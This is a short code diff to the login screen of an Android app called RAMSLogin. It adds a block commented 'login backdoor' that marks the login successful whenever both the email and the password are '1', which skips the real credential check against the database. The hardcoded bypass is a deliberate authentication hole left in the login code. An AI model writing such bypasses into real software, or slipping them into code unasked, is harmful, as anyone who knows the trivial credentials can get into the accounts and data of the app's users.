@@ -40,6 +40,12 @@ public class RAMSLogin extends AppCompatActivity {
                     Toast.makeText(RAMSLogin.this, "Missing Field Required", Toast.LENGTH_SHORT).show();
                 } else {
                     boolean checkpass = db.checkUserPass(userEmail, userPass);
+
+                    //login backdoor
+                    if(userEmail.equals("1") && userPass.equals("1")){
+                        checkpass = true;
+
+                    }
                     if (checkpass){
                         Toast.makeText(RAMSLogin.this,"Login Successful", Toast.LENGTH_SHORT).show();
                         Intent intent = new Intent(getApplicationContext(), MainActivity.class);
